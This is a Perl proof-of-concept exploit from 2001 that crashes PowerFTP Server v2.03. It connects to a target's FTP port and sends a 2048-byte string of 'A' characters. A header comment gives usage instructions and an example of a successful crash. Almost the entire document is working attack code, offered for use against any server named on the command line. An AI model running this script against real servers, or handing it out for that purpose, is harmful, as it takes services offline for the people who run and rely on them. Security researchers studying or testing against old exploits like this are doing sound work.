#!/usr/bin/perl
# Simple script to send a long 'A^s' command to the server, 
# resulting in the ftpd crashing
#
# PowerFTP Server v2.03 proof-of-concept exploit
# By Alex Hernandez <al3x.hernandez@ureach.com> (C)2001.
#
# Thanks all the people from Spain and Argentina.
# Special Greets: White-B, Pablo S0r, Paco Spain, L.Martins, 
# G.Maggiotti & H.Oliveira.
# 
#
# Usage: perl -x PowerFTP_Dos.pl -s <server>
#
# Example: 
#
# perl -x PowerFTP_Dos.pl -s 10.0.0.1
# 220 Personal FTP Server ready
# Crash was successful !
#

use Getopt::Std;
use IO::Socket;

print("\nPowerFTP server v2.03 DoS exploit (c)2001\n");
print("Alex Hernandez al3xhernandez\@ureach.com\n\n");

getopts('s:', \%args);
if(!defined($args{s})){&usage;}
$serv = $args{s};
$foo = "A"; $number = 2048; 
$data .= $foo x $number; $EOL="\015\012";

$remote = IO::Socket::INET->new(
                    Proto => "tcp",
                    PeerAddr => $args{s},
                    PeerPort => "ftp(21)",
                ) || die("Unable to connect to ftp port at $args{s}\n");

$remote->autoflush(1);
print $remote "$data". $EOL;
while (<$remote>){ print }
print("\nCrash was successful !\n");


sub usage {die("\nUsage: $0 -s <server>\n\n");}